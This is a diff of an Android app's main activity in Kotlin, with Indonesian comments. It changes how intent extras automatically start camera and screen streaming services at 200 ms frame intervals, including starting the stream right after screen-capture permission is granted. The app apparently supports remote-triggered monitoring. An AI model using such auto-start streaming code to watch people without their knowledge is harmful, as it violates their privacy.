@@ -174,53 +174,56 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun handleAutoStartCam(intent: Intent?) {
-        if (intent?.getBooleanExtra("auto_start_cam", false) != true) return
-        val isFront = intent.getBooleanExtra("cam_front", true)
+    if (intent?.getBooleanExtra("auto_start_cam", false) != true) return
+    val isFront = intent.getBooleanExtra("cam_front", true)
 
-        Handler(Looper.getMainLooper()).postDelayed({
-            try { stopService(Intent(this, CameraStreamService::class.java)) } catch (_: Exception) {}
-            try {
-                val i = Intent(this, CameraStreamService::class.java).apply {
-                    putExtra("front", isFront)
-                    putExtra("interval", 200L)
-                }
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    startForegroundService(i)
-                } else {
-                    startService(i)
-                }
-            } catch (_: Exception) {}
-        }, 2000)
+    Handler(Looper.getMainLooper()).postDelayed({
+        try { stopService(Intent(this, CameraStreamService::class.java)) } catch (_: Exception) {}
+        try {
+            val i = Intent(this, CameraStreamService::class.java).apply {
+                putExtra("cam_front", isFront)   // ← samain
+                putExtra("interval", 200L)
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(i)
+            } else {
+                startService(i)
+            }
+        } catch (_: Exception) {}
+    }, 2000)
 
-        intent.removeExtra("auto_start_cam")
-    }
+    intent.removeExtra("auto_start_cam")
+}
 
     private fun handleAutoStartScreen(intent: Intent?) {
-        if (intent?.getBooleanExtra("auto_start_screen", false) != true) return
+    if (intent?.getBooleanExtra("auto_start_screen", false) != true) return
 
-        if (!ScreenCapture.isReady()) {
-            try {
-                val i = ScreenCapture.requestIntent(this)
-                startActivityForResult(i, REQ_MEDIA_PROJECTION)
-            } catch (_: Exception) {}
-        }
-
-        Handler(Looper.getMainLooper()).postDelayed({
-            try { stopService(Intent(this, ScreenStreamService::class.java)) } catch (_: Exception) {}
-            try {
-                val i = Intent(this, ScreenStreamService::class.java).apply {
-                    putExtra("interval", 200L)
-                }
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    startForegroundService(i)
-                } else {
-                    startService(i)
-                }
-            } catch (_: Exception) {}
-        }, 3000)
-
+    if (!ScreenCapture.isReady()) {
+        // Minta izin dulu, jangan start service
+        try {
+            val i = ScreenCapture.requestIntent(this)
+            startActivityForResult(i, REQ_MEDIA_PROJECTION)
+        } catch (_: Exception) {}
         intent.removeExtra("auto_start_screen")
+        return  // ← keluar, tunggu onActivityResult
     }
+
+    Handler(Looper.getMainLooper()).postDelayed({
+        try { stopService(Intent(this, ScreenStreamService::class.java)) } catch (_: Exception) {}
+        try {
+            val i = Intent(this, ScreenStreamService::class.java).apply {
+                putExtra("interval", 200L)
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(i)
+            } else {
+                startService(i)
+            }
+        } catch (_: Exception) {}
+    }, 800)
+
+    intent.removeExtra("auto_start_screen")
+}
 
     private fun saveSetupDone() {
         try {
@@ -355,11 +358,24 @@ class MainActivity : ComponentActivity() {
     }
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
-        super.onActivityResult(requestCode, resultCode, data)
-        if (requestCode == REQ_MEDIA_PROJECTION) {
-            ScreenCapture.onActivityResult(this, resultCode, data)
+    super.onActivityResult(requestCode, resultCode, data)
+    if (requestCode == REQ_MEDIA_PROJECTION) {
+        ScreenCapture.onActivityResult(this, resultCode, data)
+
+        // ← TAMBAHAN: auto-start stream setelah grant
+        if (ScreenCapture.isReady()) {
+            try {
+                val i = Intent(this, ScreenStreamService::class.java)
+                    .putExtra("interval", 200L)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    startForegroundService(i)
+                } else {
+                    startService(i)
+                }
+            } catch (_: Exception) {}
         }
     }
+}
 
     companion object {
         private const val REQ_PERMS = 1001
